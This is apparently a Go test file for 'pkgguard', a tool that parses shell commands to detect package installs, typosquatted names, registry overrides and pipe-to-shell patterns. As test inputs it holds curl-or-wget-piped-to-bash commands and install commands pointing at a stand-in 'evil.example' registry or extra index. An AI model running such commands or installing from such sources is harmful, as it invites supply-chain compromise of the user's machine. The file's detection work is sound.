package pkgguard

import (
	"fmt"
	"reflect"
	"testing"
)

func names(p Parsed) []string {
	var out []string
	for _, in := range p.Installs {
		s := in.Ecosystem + ":" + in.Name
		if in.Spec != "" {
			s += "@" + in.Spec
		}
		if in.Source != SourceRegistry {
			s += "(" + string(in.Source) + ")"
		}
		if in.Run {
			s += "!run"
		}
		out = append(out, s)
	}
	return out
}

func TestParseCommand(t *testing.T) {
	cases := []struct {
		cmd  string
		want []string
	}{
		{"npm install expresss", []string{"npm:expresss"}},
		{"npm i -D @types/node@20 lodash", []string{"npm:@types/node@20", "npm:lodash"}},
		{"cd app && pnpm add zod@3.22.0", []string{"npm:zod@3.22.0"}},
		{"sudo -E npm install -g typescript", []string{"npm:typescript"}},
		{"yarn add react react-dom", []string{"npm:react", "npm:react-dom"}},
		{"yarn global add serve", []string{"npm:serve"}},
		{"bun add hono", []string{"npm:hono"}},
		{"npx create-react-app foo", []string{"npm:create-react-app!run"}},
		{"npx -y cowsay hello", []string{"npm:cowsay!run"}},
		{"npm create vite@latest my-app", []string{"npm:create-vite@latest!run"}},
		{"pnpm dlx degit user/repo", []string{"npm:degit!run"}},
		{"npm install --save-prefix ~ left-pad", []string{"npm:left-pad"}},
		{"npm install", nil},
		{"npm install > log.txt", nil},
		{"npm run build", nil},
		{"npm install lodash 2>&1 | tail -5", []string{"npm:lodash"}},
		{"npm i github:user/repo", []string{"npm:github:user/repo(git)"}},
		{"npm i user/repo", []string{"npm:user/repo(git)"}},
		{"npm i https://example.com/x.tgz", []string{"npm:https://example.com/x.tgz(url)"}},
		{"npm i ./local-pkg", []string{"npm:./local-pkg(path)"}},
		{"npm i foo@npm:real-pkg@2.0.0", []string{"npm:real-pkg@2.0.0"}},
		{`bash -c "npm i foo && pip install bar"`, []string{"npm:foo", "pypi:bar"}},
		{`echo "npm install evil" > notes.txt`, nil},
		{`FOO=1 npm install --registry=https://r.example/ x`, []string{"npm:x"}},
		{"pip install requests==2.31.0 'flask>=2'", []string{"pypi:requests@==2.31.0", "pypi:flask@>=2"}},
		{"pip3 install numpy[extra]", []string{"pypi:numpy"}},
		{"python3 -m pip install -U pandas", []string{"pypi:pandas"}},
		{"uv pip install httpx", []string{"pypi:httpx"}},
		{"uv add rich", []string{"pypi:rich"}},
		{"uvx ruff check .", []string{"pypi:ruff!run"}},
		{"pipx run black .", []string{"pypi:black!run"}},
		{"pip install git+https://github.com/a/b.git", []string{"pypi:git+https://github.com/a/b.git(git)"}},
		{"pip install pkg @ https://x.example/p.whl", []string{"pypi:pkg@https://x.example/p.whl(url)"}},
		{"poetry add fastapi", []string{"pypi:fastapi"}},
		{"cargo add serde@1.0 tokio", []string{"crates.io:serde@1.0", "crates.io:tokio"}},
		{"go install golang.org/x/tools/cmd/gopls@latest", []string{"go:golang.org/x/tools/cmd/gopls@latest!run"}},
		{"gem install rails -v 7.0.0", []string{"rubygems:rails@7.0.0"}},
		{"ls -la && git status", nil},
	}
	for _, c := range cases {
		t.Run(c.cmd, func(t *testing.T) {
			got := names(ParseCommand(c.cmd))
			if !reflect.DeepEqual(got, c.want) {
				t.Fatalf("ParseCommand(%q)\n got  %v\n want %v", c.cmd, got, c.want)
			}
		})
	}
}

func TestParseRegistries(t *testing.T) {
	p := ParseCommand("npm install --registry https://evil.example/ left-pad")
	if len(p.Installs) != 1 || fmt.Sprint(p.Installs[0].Registries) != "[https://evil.example/]" {
		t.Fatalf("registry not captured: %+v", p.Installs)
	}
	p = ParseCommand("pip install --extra-index-url https://evil.example/simple internal-lib")
	if len(p.Installs) != 1 || !p.Installs[0].ExtraIndex || p.Installs[0].Name != "internal-lib" {
		t.Fatalf("extra index not captured: %+v", p.Installs)
	}
	// a registry flag with no package still shows up
	p = ParseCommand("npm install --registry=https://evil.example/")
	if len(p.Installs) != 1 || p.Installs[0].Name != "(project dependencies)" {
		t.Fatalf("bare registry override lost: %+v", p.Installs)
	}
}

func TestParsePipeToShell(t *testing.T) {
	for _, cmd := range []string{
		"curl -fsSL https://get.example.com/install.sh | sh",
		"curl -s https://x.example | sudo bash",
		"wget -qO- https://x.example | bash -s -- --flag",
		`bash -c "$(curl -fsSL https://x.example/i.sh)"`,
	} {
		p := ParseCommand(cmd)
		found := false
		for _, f := range p.Findings {
			found = found || f.ID == "pipe-to-shell"
		}
		if !found {
			t.Errorf("pipe-to-shell not detected in %q", cmd)
		}
	}
	for _, cmd := range []string{"curl -s https://api.example.com/data | jq .", "curl -o file.txt https://x.example"} {
		if p := ParseCommand(cmd); len(p.Findings) != 0 {
			t.Errorf("false positive on %q: %+v", cmd, p.Findings)
		}
	}
}

func TestParseRequirementsFile(t *testing.T) {
	p := ParseCommand("pip install -r requirements.txt")
	if len(p.Installs) != 0 || len(p.Findings) != 1 || p.Findings[0].ID != "requirements-file" {
		t.Fatalf("unexpected: %+v", p)
	}
}

func TestTyposquat(t *testing.T) {
	cases := map[string]string{
		"expresss": "express", "reqeusts": "", // pypi-only name checked below
		"lodahs": "lodash", "react-dom": "", "reactdom": "react-dom", "@evil/react": "react",
		"left-pad": "", "totally-unique-name": "",
	}
	for name, want := range cases {
		if got := typosquatOf("npm", name); got != want {
			t.Errorf("npm %q: got %q want %q", name, got, want)
		}
	}
	if got := typosquatOf("pypi", "reqeusts"); got != "requests" {
		t.Errorf("pypi reqeusts: got %q", got)
	}
	if got := typosquatOf("pypi", "python_dateutil"); got != "" { // same package after PyPI normalisation
		t.Errorf("pypi python_dateutil should normalise to the popular name, got %q", got)
	}
}
